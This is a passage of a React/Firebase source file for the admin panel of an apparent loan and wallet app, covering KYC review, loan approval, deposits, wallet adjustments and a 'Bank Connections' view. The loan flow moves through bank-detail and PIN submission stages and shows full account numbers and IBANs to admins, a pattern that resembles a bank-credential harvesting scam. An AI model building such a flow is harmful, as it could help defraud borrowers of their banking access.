import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { collection, query, onSnapshot, doc, updateDoc, serverTimestamp, addDoc, where, increment } from 'firebase/firestore';
import { db } from '../../lib/firebase';
import { useAuth } from '../../hooks/useAuth';
import { Logo } from '../../components/Logo';
import { ThemeToggle } from '../../components/ThemeToggle';
import { 
  CheckCircle, 
  XCircle, 
  Users, 
  FileText, 
  TrendingUp, 
  Search,
  Filter,
  ArrowUpRight,
  ShieldCheck,
  LogOut,
  UserCheck,
  AlertCircle,
  Eye,
  ChevronDown,
  Wallet,
  Plus
} from 'lucide-react';
import { auth } from '../../lib/firebase';
import { useNavigate } from 'react-router-dom';

export const AdminPage = () => {
  const { user, isAdmin, loading: authLoading } = useAuth();
  const navigate = useNavigate();
  const [users, setUsers] = useState<any[]>([]);
  const [loans, setLoans] = useState<any[]>([]);
  const [pendingKYCs, setPendingKYCs] = useState<any[]>([]);
  const [pendingDeposits, setPendingDeposits] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'dashboard' | 'users' | 'loans' | 'kyc' | 'deposits' | 'banks' | 'wallet'>('dashboard');
  const [selectedKYC, setSelectedKYC] = useState<any | null>(null);
  const [selectedLoan, setSelectedLoan] = useState<any | null>(null);
  const [selectedDeposit, setSelectedDeposit] = useState<any | null>(null);
  const [selectedUser, setSelectedUser] = useState<any | null>(null);
  const [rejectionReason, setRejectionReason] = useState('');
  const [showRejectionModal, setShowRejectionModal] = useState(false);

  // Wallet Adjustment State
  const [walletTargetUserId, setWalletTargetUserId] = useState('');
  const [walletAmount, setWalletAmount] = useState('');
  const [walletNote, setWalletNote] = useState('Admin adjustment');
  const [isAdjusting, setIsAdjusting] = useState(false);
  const [walletSuccess, setWalletSuccess] = useState(false);
  const [message, setMessage] = useState<{ text: string, type: 'success' | 'error' } | null>(null);

  useEffect(() => {
    if (message) {
      const timer = setTimeout(() => setMessage(null), 5000);
      return () => clearTimeout(timer);
    }
  }, [message]);

  useEffect(() => {
    if (!authLoading && !isAdmin && user) {
      navigate('/dashboard');
    }
  }, [isAdmin, authLoading, navigate, user]);

  const handleSignOut = () => {
    auth.signOut();
    navigate('/');
  };

  useEffect(() => {
    if (!user || !isAdmin) return;

    // Listen for all users
    let unsubscribeUsers: (() => void) | null = null;
    try {
      const usersQuery = query(collection(db, 'users'));
      unsubscribeUsers = onSnapshot(usersQuery, (snapshot) => {
        const userData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setUsers(userData);
      }, (err) => {
        if (err.code !== 'permission-denied') {
          console.error('Error fetching users for admin:', err);
        }
      });
    } catch (err) {
      console.error('Error setting up admin users listener:', err);
    }

    // Listen for loans
    let unsubscribeLoans: (() => void) | null = null;
    try {
      const loansQuery = query(collection(db, 'loans'));
      unsubscribeLoans = onSnapshot(loansQuery, (snapshot) => {
        const loanData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setLoans(loanData);
      }, (err) => {
        if (err.code !== 'permission-denied') {
          console.error('Error fetching loans for admin:', err);
        }
      });
    } catch (err) {
      console.error('Error setting up admin loans listener:', err);
    }

    // Listen for pending KYCs
    let unsubscribeKYC: (() => void) | null = null;
    try {
      const kycQuery = query(collection(db, 'users'), where('kycStatus', '==', 'pending'));
      unsubscribeKYC = onSnapshot(kycQuery, (snapshot) => {
        const kycData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setPendingKYCs(kycData);
        setLoading(false);
      }, (err) => {
        if (err.code !== 'permission-denied') {
          console.error('Error fetching pending KYCs for admin:', err);
        }
        setLoading(false);
      });
    } catch (err) {
      console.error('Error setting up admin KYC listener:', err);
      setLoading(false);
    }

    // Listen for pending deposits
    let unsubscribeDeposits: (() => void) | null = null;
    try {
      const depositsQuery = query(
        collection(db, 'transactions'), 
        where('type', '==', 'deposit'),
        where('status', '==', 'pending')
      );
      unsubscribeDeposits = onSnapshot(depositsQuery, (snapshot) => {
        const depositData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setPendingDeposits(depositData);
      }, (err) => {
        if (err.code !== 'permission-denied') {
          console.error('Error fetching pending deposits for admin:', err);
        }
      });
    } catch (err) {
      console.error('Error setting up admin deposits listener:', err);
    }

    return () => {
      if (unsubscribeUsers) unsubscribeUsers();
      if (unsubscribeLoans) unsubscribeLoans();
      if (unsubscribeKYC) unsubscribeKYC();
      if (unsubscribeDeposits) unsubscribeDeposits();
    };
  }, [user]);

  const handleLoanStatusUpdate = async (loanId: string, status: string) => {
    try {
      const loan = loans.find(l => l.id === loanId);
      if (!loan) return;

      await updateDoc(doc(db, 'loans', loanId), {
        status,
        updatedAt: serverTimestamp(),
        reviewedBy: user?.email,
      });

      // Update user document for instant UI feedback
      await updateDoc(doc(db, 'users', loan.userId), {
        activeLoanStatus: status,
        updatedAt: serverTimestamp()
      });

      // If disbursed, update user's wallet balance
      if (status === 'disbursed') {
        await updateDoc(doc(db, 'users', loan.userId), {
          walletBalance: increment(loan.amount)
        });
      }

      // Notify user
      try {
        const userName = loan.userName || loan.userEmail?.split('@')[0] || 'User';
        await addDoc(collection(db, 'notifications', loan.userId, 'items'), {
          type: 'loan_update',
          title: status === 'approved' ? 'Loan Approved' : 
                 status === 'rejected' ? 'Loan Rejected' : 
                 status === 'disbursed' ? 'Loan Disbursed' : 'Loan Update',
          message: status === 'approved' 
            ? `Hello ${userName}, your loan application for $${loan.amount.toLocaleString()} has been approved! Please connect your bank account to proceed.` 
            : status === 'rejected' 
            ? `Hello ${userName}, we regret to inform you that your loan application for $${loan.amount.toLocaleString()} was not approved at this time.`
            : status === 'disbursed'
            ? `Congratulations ${userName}! Your loan of $${loan.amount.toLocaleString()} has been successfully disbursed to your wallet.`
            : `Hello ${userName}, your loan status has been updated to ${status}.`,
          createdAt: serverTimestamp(),
          read: false,
        });
      } catch (notifyErr) {
        console.error('Error sending notification:', notifyErr);
      }

      setMessage({ text: `Loan updated to ${status} successfully!`, type: 'success' });
    } catch (err: any) {
      console.error('Error updating loan status:', err);
      setMessage({ text: `Failed to update loan status: ${err.message}`, type: 'error' });
    }
  };

  const handleKYCUpdate = async (userId: string, status: 'verified' | 'rejected', reason?: string) => {
    try {
      await updateDoc(doc(db, 'users', userId), {
        kycStatus: status,
        rejectionReason: reason || null,
        kycReviewedAt: serverTimestamp(),
        kycReviewedBy: user?.email,
      });

      // Notify user using the subcollection pattern
      try {
        await addDoc(collection(db, 'notifications', userId, 'items'), {
          type: 'kyc_update',
          title: status === 'verified' ? 'KYC Verified' : 'KYC Rejected',
          message: status === 'verified' 
            ? 'Your identity verification has been approved. You can now apply for loans.' 
            : `Your identity verification was rejected. Reason: ${reason}`,
          createdAt: serverTimestamp(),
          read: false,
        });
      } catch (notifyErr) {
        console.error('Error sending notification:', notifyErr);
        // Don't fail the whole process if notification fails
      }

      setMessage({ text: `User KYC ${status === 'verified' ? 'verified' : 'rejected'} successfully!`, type: 'success' });
      setSelectedKYC(null);
      setShowRejectionModal(false);
      setRejectionReason('');
    } catch (err: any) {
      console.error('Error updating KYC status:', err);
      setMessage({ text: `Failed to update KYC status: ${err.message}`, type: 'error' });
    }
  };

  const handleDepositUpdate = async (depositId: string, status: 'completed' | 'rejected') => {
    try {
      const deposit = pendingDeposits.find(d => d.id === depositId);
      if (!deposit) return;

      // Update transaction status
      await updateDoc(doc(db, 'transactions', depositId), {
        status,
        reviewedAt: serverTimestamp(),
        reviewedBy: user?.email,
      });

      if (status === 'completed') {
        // Add money to user account
        await updateDoc(doc(db, 'users', deposit.userId), {
          walletBalance: increment(deposit.amount),
          updatedAt: serverTimestamp()
        });
      }

      // Notify user
      try {
        await addDoc(collection(db, 'notifications', deposit.userId, 'items'), {
          type: 'deposit_update',
          title: status === 'completed' ? 'Deposit Approved' : 'Deposit Rejected',
          message: status === 'completed' 
            ? `Your deposit of $${deposit.amount.toLocaleString()} has been approved and added to your balance.` 
            : `Your deposit of $${deposit.amount.toLocaleString()} was rejected. Please contact support for more information.`,
          createdAt: serverTimestamp(),
          read: false,
        });
      } catch (notifyErr) {
        console.error('Error sending notification:', notifyErr);
      }

      setMessage({ text: `Deposit ${status === 'completed' ? 'approved' : 'rejected'} successfully!`, type: 'success' });
      setSelectedDeposit(null);
    } catch (err: any) {
      console.error('Error updating deposit status:', err);
      setMessage({ text: `Failed to update deposit status: ${err.message}`, type: 'error' });
    }
  };

  const handleWalletAdjustment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!walletTargetUserId || !walletAmount || isAdjusting) return;

    setIsAdjusting(true);
    try {
      const amount = parseFloat(walletAmount);
      if (isNaN(amount)) throw new Error('Invalid amount');

      await updateDoc(doc(db, 'users', walletTargetUserId), {
        walletBalance: increment(amount),
        updatedAt: serverTimestamp()
      });

      // Create a transaction record
      await addDoc(collection(db, 'transactions'), {
        userId: walletTargetUserId,
        amount: amount,
        type: 'admin_adjustment',
        status: 'completed',
        note: walletNote,
        createdAt: serverTimestamp(),
        reviewedBy: user?.email
      });

      // Notify user
      await addDoc(collection(db, 'notifications', walletTargetUserId, 'items'), {
        type: 'wallet_adjustment',
        title: 'Wallet Balance Updated',
        message: `An admin has adjusted your wallet balance by $${amount.toLocaleString()}. Note: ${walletNote}`,
        createdAt: serverTimestamp(),
        read: false,
      });

      setWalletSuccess(true);
      setWalletAmount('');
      setWalletNote('Admin adjustment');
      setMessage({ text: 'Wallet adjusted successfully!', type: 'success' });
      setTimeout(() => setWalletSuccess(false), 3000);
    } catch (err: any) {
      console.error('Error adjusting wallet:', err);
      setMessage({ text: `Failed to adjust wallet: ${err.message}`, type: 'error' });
    } finally {
      setIsAdjusting(false);
    }
  };

  const pendingLoans = loans.filter(l => l.status === 'pending');
  const inProgressLoans = loans.filter(l => ['bank_details_submitted', 'pin_sent'].includes(l.status));
  const pinVerificationLoans = loans.filter(l => l.status === 'pin_submitted');
  const bankConnectedLoans = loans.filter(l => l.bankDetails);
  const totalVolume = loans.reduce((acc, l) => acc + (l.status === 'approved' || l.status === 'disbursed' ? l.amount : 0), 0);
  const totalUsers = users.length;
  const verifiedUsers = users.filter(u => u.kycStatus === 'verified').length;

  const formatDate = (timestamp: any) => {
    if (!timestamp) return 'N/A';
    try {
      if (timestamp.toDate) return timestamp.toDate().toLocaleString();
      return new Date(timestamp).toLocaleString();
    } catch (e) {
      return 'N/A';
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-primary">
      {/* Top Bar */}
      <header className="bg-white dark:bg-primary border-b border-gray-200 dark:border-zinc-800 p-6 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-4">
            <Logo className="h-6" />
            <span className="bg-accent/10 text-accent px-3 py-1 rounded-full text-xs font-black tracking-widest uppercase flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5" />
              Admin Panel
            </span>
          </div>
          <div className="flex items-center gap-4">
            <ThemeToggle />
            <div className="flex items-center gap-3 pl-4 border-l border-gray-200 dark:border-zinc-800">
              <div className="text-right hidden sm:block">
                <p className="text-sm font-bold dark:text-white">{user?.email}</p>
                <p className="text-xs text-gray-500">System Administrator</p>
              </div>
              <div className="w-10 h-10 rounded-full bg-accent text-white flex items-center justify-center font-black">
                {user?.email?.[0].toUpperCase()}
              </div>
              <button 
                onClick={handleSignOut}
                className="p-2 rounded-lg hover:bg-red-50 text-gray-400 hover:text-red-500 transition-all border border-gray-200 dark:border-zinc-800"
                title="Sign Out"
              >
                <LogOut className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto p-6 md:p-10">
        {message && (
          <motion.div 
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className={`mb-6 p-4 rounded-2xl text-sm font-bold uppercase tracking-widest flex items-center gap-3 ${
              message.type === 'success' ? 'bg-green-500/10 text-green-500' : 'bg-red-500/10 text-red-500'
            }`}
          >
            {message.type === 'success' ? <CheckCircle className="w-5 h-5" /> : <AlertCircle className="w-5 h-5" />}
            {message.text}
          </motion.div>
        )}

        {/* Tabs Navigation */}
        <div className="flex flex-wrap gap-2 mb-8 p-1 bg-gray-100 dark:bg-zinc-900 rounded-2xl w-fit">
          <TabButton 
            active={activeTab === 'dashboard'} 
            onClick={() => setActiveTab('dashboard')}
            icon={<TrendingUp className="w-4 h-4" />}
            label="Overview"
          />
          <TabButton 
            active={activeTab === 'users'} 
            onClick={() => setActiveTab('users')}
            icon={<Users className="w-4 h-4" />}
            label="Users"
          />
          <TabButton 
            active={activeTab === 'kyc'} 
            onClick={() => setActiveTab('kyc')}
            icon={<ShieldCheck className="w-4 h-4" />}
            label="KYC"
            count={pendingKYCs.length}
          />
          <TabButton 
            active={activeTab === 'loans'} 
            onClick={() => setActiveTab('loans')}
            icon={<FileText className="w-4 h-4" />}
            label="Loans"
            count={pendingLoans.length}
          />
          <TabButton 
            active={activeTab === 'deposits'} 
            onClick={() => setActiveTab('deposits')}
            icon={<ArrowUpRight className="w-4 h-4" />}
            label="Deposits"
            count={pendingDeposits.length}
          />
          <TabButton 
            active={activeTab === 'banks'} 
            onClick={() => setActiveTab('banks')}
            icon={<UserCheck className="w-4 h-4" />}
            label="Bank Connections"
          />
          <TabButton 
            active={activeTab === 'wallet'} 
            onClick={() => setActiveTab('wallet')}
            icon={<Wallet className="w-4 h-4" />}
            label="Wallet"
          />
        </div>

        {activeTab === 'dashboard' ? (
          <div className="space-y-10">
            {/* Stats Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              <AdminStatCard 
                icon={<Users className="text-blue-500" />}
                label="Total Users"
                value={totalUsers.toString()}
                subValue={`${verifiedUsers} Verified`}
              />
              <AdminStatCard 
                icon={<TrendingUp className="text-accent" />}
                label="Loan Volume"
                value={`$${totalVolume.toLocaleString()}`}
                subValue={`${loans.length} Applications`}
              />
              <AdminStatCard 
                icon={<ShieldCheck className="text-purple-500" />}
                label="Pending KYC"
                value={pendingKYCs.length.toString()}
                subValue="Awaiting Review"
              />
              <AdminStatCard 
                icon={<ArrowUpRight className="text-orange-500" />}
                label="Pending Deposits"
                value={pendingDeposits.length.toString()}
                subValue="Action Required"
              />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
              <div className="card">
                <h3 className="text-lg font-bold mb-6 dark:text-white uppercase tracking-widest text-xs opacity-50">Recent Activity</h3>
                <div className="space-y-4">
                  {loans.slice(0, 5).map((loan) => (
                    <div key={loan.id} className="flex items-center justify-between p-3 rounded-xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-full bg-accent/10 flex items-center justify-center">
                          <FileText className="w-4 h-4 text-accent" />
                        </div>
                        <div>
                          <p className="text-sm font-bold dark:text-white">{loan.userEmail}</p>
                          <p className="text-[10px] text-gray-500 uppercase tracking-widest">Loan Application • ${loan.amount}</p>
                        </div>
                      </div>
                      <span className={`text-[10px] font-black uppercase px-2 py-1 rounded-full ${
                        loan.status === 'pending' ? 'bg-yellow-100 text-yellow-700' :
                        loan.status === 'approved' ? 'bg-green-100 text-green-700' :
                        'bg-gray-100 text-gray-700'
                      }`}>
                        {loan.status}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="card">
                <h3 className="text-lg font-bold mb-6 dark:text-white uppercase tracking-widest text-xs opacity-50">KYC Funnel</h3>
                <div className="space-y-6">
                  <FunnelStep label="Total Registered" value={totalUsers} total={totalUsers} color="bg-blue-500" />
                  <FunnelStep label="KYC Submitted" value={users.filter(u => u.kycStatus).length} total={totalUsers} color="bg-purple-500" />
                  <FunnelStep label="KYC Verified" value={verifiedUsers} total={totalUsers} color="bg-green-500" />
                </div>
              </div>
            </div>
          </div>
        ) : activeTab === 'users' ? (
          <div className="card">
            <div className="flex justify-between items-center mb-8">
              <h2 className="text-xl font-bold dark:text-white uppercase tracking-tighter">User Management</h2>
              <div className="relative">
                <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
                <input 
                  type="text" 
                  placeholder="Search users..." 
                  className="pl-10 pr-4 py-2 bg-gray-50 dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-xl text-sm focus:outline-none focus:ring-2 focus:ring-accent/20"
                />
              </div>
            </div>
            <div className="overflow-x-auto">
              <table className="w-full text-left">
                <thead>
                  <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-[10px] font-black uppercase tracking-widest">
                    <th className="pb-4">User</th>
                    <th className="pb-4">KYC Status</th>
                    <th className="pb-4">Wallet Balance</th>
                    <th className="pb-4">Joined</th>
                    <th className="pb-4 text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                  {users.map((u) => (
                    <tr key={u.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                      <td className="py-4">
                        <div className="font-bold dark:text-white">{u.email}</div>
                        <div className="text-[10px] text-gray-400 font-mono">{u.id}</div>
                      </td>
                      <td className="py-4">
                        <span className={`px-2 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${
                          u.kycStatus === 'verified' ? 'bg-green-100 text-green-700' :
                          u.kycStatus === 'pending' ? 'bg-yellow-100 text-yellow-700' :
                          'bg-gray-100 text-gray-700'
                        }`}>
                          {u.kycStatus || 'Not Started'}
                        </span>
                      </td>
                      <td className="py-4 font-bold text-accent">${(u.walletBalance || 0).toLocaleString()}</td>
                      <td className="py-4 text-gray-500 text-sm">{formatDate(u.createdAt)}</td>
                      <td className="py-4 text-right">
                        <button 
                          onClick={() => setSelectedUser(u)}
                          className="p-2 hover:bg-accent/10 text-gray-400 hover:text-accent rounded-lg transition-all"
                        >
                          <Eye className="w-4 h-4" />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        ) : activeTab === 'banks' ? (
          <div className="card">
            <h2 className="text-xl font-bold mb-8 dark:text-white uppercase tracking-tighter">Bank Connections</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {bankConnectedLoans.length === 0 ? (
                <div className="col-span-full py-20 text-center text-gray-500 italic">
                  No bank connections found in current applications.
                </div>
              ) : (
                bankConnectedLoans.map((loan) => (
                  <div key={loan.id} className="p-6 rounded-2xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800">
                    <div className="flex items-center gap-3 mb-4">
                      <div className="w-10 h-10 rounded-xl bg-accent/10 flex items-center justify-center">
                        <UserCheck className="w-5 h-5 text-accent" />
                      </div>
                      <div>
                        <p className="text-sm font-bold dark:text-white">{loan.userEmail}</p>
                        <p className="text-[10px] text-gray-500 uppercase tracking-widest">Connected via Loan #{loan.id.slice(0, 6)}</p>
                      </div>
                    </div>
                    <div className="space-y-3 pt-4 border-t border-gray-200 dark:border-zinc-800">
                      <div className="flex justify-between text-xs">
                        <span className="text-gray-400 uppercase font-black tracking-widest">Bank</span>
                        <span className="font-bold dark:text-white">{loan.bankDetails?.bankName}</span>
                      </div>
                      <div className="flex justify-between text-xs">
                        <span className="text-gray-400 uppercase font-black tracking-widest">Account</span>
                        <span className="font-bold dark:text-white">{loan.bankDetails?.accountNumber}</span>
                      </div>
                      <div className="flex justify-between text-xs">
                        <span className="text-gray-400 uppercase font-black tracking-widest">Name</span>
                        <span className="font-bold dark:text-white">{loan.bankDetails?.accountName}</span>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        ) : activeTab === 'wallet' ? (
          <div className="card max-w-2xl mx-auto">
            <div className="flex items-center gap-4 mb-8">
              <div className="w-12 h-12 rounded-2xl bg-accent/10 flex items-center justify-center">
                <Wallet className="w-6 h-6 text-accent" />
              </div>
              <div>
                <h2 className="text-2xl font-black tracking-tighter dark:text-white uppercase">Wallet Adjustment</h2>
                <p className="text-gray-500 text-sm">Add custom funds to any user's wallet balance</p>
              </div>
            </div>

            <form onSubmit={handleWalletAdjustment} className="space-y-6">
              <div>
                <label className="block text-xs font-black text-gray-400 uppercase tracking-widest mb-2">Select User</label>
                <div className="relative">
                  <select 
                    value={walletTargetUserId}
                    onChange={(e) => setWalletTargetUserId(e.target.value)}
                    className="w-full p-4 bg-gray-50 dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-2xl focus:ring-2 focus:ring-accent outline-none transition-all appearance-none dark:text-white"
                    required
                  >
                    <option value="">Choose a user...</option>
                    {users.map(u => (
                      <option key={u.id} value={u.id}>
                        {u.fullName || u.email} ({u.email}) - Balance: ${u.walletBalance || 0}
                      </option>
                    ))}
                  </select>
                  <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 pointer-events-none" />
                </div>
              </div>

              <div>
                <label className="block text-xs font-black text-gray-400 uppercase tracking-widest mb-2">Adjustment Amount ($)</label>
                <div className="relative">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">$</div>
                  <input 
                    type="number"
                    step="0.01"
                    value={walletAmount}
                    onChange={(e) => setWalletAmount(e.target.value)}
                    placeholder="0.00"
                    className="w-full p-4 pl-8 bg-gray-50 dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-2xl focus:ring-2 focus:ring-accent outline-none transition-all dark:text-white"
                    required
                  />
                </div>
                <p className="mt-2 text-[10px] text-gray-500 uppercase tracking-widest">Use negative numbers to deduct funds</p>
              </div>

              <div>
                <label className="block text-xs font-black text-gray-400 uppercase tracking-widest mb-2">Adjustment Note</label>
                <input 
                  type="text"
                  value={walletNote}
                  onChange={(e) => setWalletNote(e.target.value)}
                  placeholder="Reason for adjustment..."
                  className="w-full p-4 bg-gray-50 dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-2xl focus:ring-2 focus:ring-accent outline-none transition-all dark:text-white"
                  required
                />
              </div>

              <button 
                type="submit"
                disabled={isAdjusting}
                className="w-full py-4 bg-accent hover:bg-accent/90 text-white rounded-2xl font-black uppercase tracking-widest transition-all shadow-lg shadow-accent/20 flex items-center justify-center gap-2 disabled:opacity-50"
              >
                {isAdjusting ? (
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                ) : (
                  <>
                    <Plus className="w-5 h-5" />
                    Apply Adjustment
                  </>
                )}
              </button>

              {walletSuccess && (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="p-4 bg-green-50 dark:bg-green-900/20 border border-green-100 dark:border-green-800 rounded-2xl flex items-center gap-3 text-green-600 dark:text-green-400"
                >
                  <CheckCircle className="w-5 h-5" />
                  <p className="text-sm font-bold">Wallet adjusted successfully!</p>
                </motion.div>
              )}
            </form>
          </div>
        ) : activeTab === 'loans' ? (
          <div className="space-y-8">
            {/* Pending Review */}
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Pending Review
                <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pendingLoans.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">Applicant</th>
                      <th className="pb-4 font-bold">Amount</th>
                      <th className="pb-4 font-bold">Purpose</th>
                      <th className="pb-4 font-bold">Date</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {loading ? (
                      <tr>
                        <td colSpan={5} className="py-10 text-center text-gray-500">
                          Loading applications...
                        </td>
                      </tr>
                    ) : pendingLoans.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="py-10 text-center text-gray-500">
                          No pending applications to review.
                        </td>
                      </tr>
                    ) : (
                      pendingLoans.map((loan) => (
                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
                          </td>
                          <td className="py-4 font-bold text-accent">${loan.amount.toLocaleString()}</td>
                          <td className="py-4 text-gray-500">{loan.purpose}</td>
                          <td className="py-4 text-gray-500">
                            {loan.createdAt?.toDate ? loan.createdAt.toDate().toLocaleDateString() : 'Just now'}
                          </td>
                          <td className="py-4 text-right">
                            <div className="flex justify-end gap-2">
                              <button 
                                onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
                                className="p-2 rounded-lg hover:bg-red-50 text-gray-400 hover:text-red-500 transition-all"
                                title="Reject"
                              >
                                <XCircle className="w-6 h-6" />
                              </button>
                              <button 
                                onClick={() => handleLoanStatusUpdate(loan.id, 'approved')}
                                className="p-2 rounded-lg hover:bg-green-50 text-gray-400 hover:text-accent transition-all"
                                title="Approve"
                              >
                                <CheckCircle className="w-6 h-6" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* In Progress */}
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                In Progress (Bank Connection)
                <span className="bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {inProgressLoans.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">Applicant</th>
                      <th className="pb-4 font-bold">Status</th>
                      <th className="pb-4 font-bold">Details Provided</th>
                      <th className="pb-4 font-bold text-right">Last Activity</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {inProgressLoans.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          No loans currently in bank connection phase.
                        </td>
                      </tr>
                    ) : (
                      inProgressLoans.map((loan) => (
                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
                          </td>
                          <td className="py-4">
                            <span className={`px-2 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${
                              loan.status === 'bank_details_submitted' 
                                ? 'bg-blue-100 text-blue-700' 
                                : 'bg-purple-100 text-purple-700'
                            }`}>
                              {loan.status === 'bank_details_submitted' ? 'Filling Additional Info' : 'Awaiting PIN'}
                            </span>
                          </td>
                          <td className="py-4">
                            <div className="text-xs text-gray-500">
                              {loan.bankDetails ? '✓ Bank Details' : '✗ Bank Details'}<br/>
                              {loan.additionalDetails ? '✓ Additional Info' : '✗ Additional Info'}
                            </div>
                          </td>
                          <td className="py-4 text-right text-gray-500 text-xs">
                            <div className="flex justify-end items-center gap-2">
                              <span>{loan.updatedAt?.toDate ? loan.updatedAt.toDate().toLocaleString() : 'Just now'}</span>
                              <button 
                                onClick={() => setSelectedLoan(loan)}
                                className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-400"
                              >
                                <Eye className="w-4 h-4" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* PIN Verified */}
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Ready for Final Approval & Disbursement
                <span className="bg-green-100 text-green-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pinVerificationLoans.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">Applicant & Loan</th>
                      <th className="pb-4 font-bold">Amount & Purpose</th>
                      <th className="pb-4 font-bold">Full Verification Data</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {pinVerificationLoans.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          No loans ready for final review.
                        </td>
                      </tr>
                    ) : (
                      pinVerificationLoans.map((loan) => (
                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
                            <div className="mt-1 text-[10px] text-accent font-black uppercase">PIN VERIFIED ✓</div>
                          </td>
                          <td className="py-4">
                            <div className="font-bold text-accent text-lg">${loan.amount.toLocaleString()}</div>
                            <div className="text-xs text-gray-500 italic">"{loan.purpose}"</div>
                          </td>
                          <td className="py-4">
                            <div className="grid grid-cols-2 gap-x-6 gap-y-2">
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Primary Bank</p>
                                <p className="text-xs font-bold dark:text-white">{loan.bankDetails?.bankName}</p>
                                <p className="text-[10px] text-gray-500">{loan.bankDetails?.accountNumber}</p>
                                <p className="text-[10px] text-gray-400 italic">{loan.bankDetails?.accountName}</p>
                              </div>
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Additional Info</p>
                                <p className="text-[10px] text-gray-500">IBAN: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.iban}</span></p>
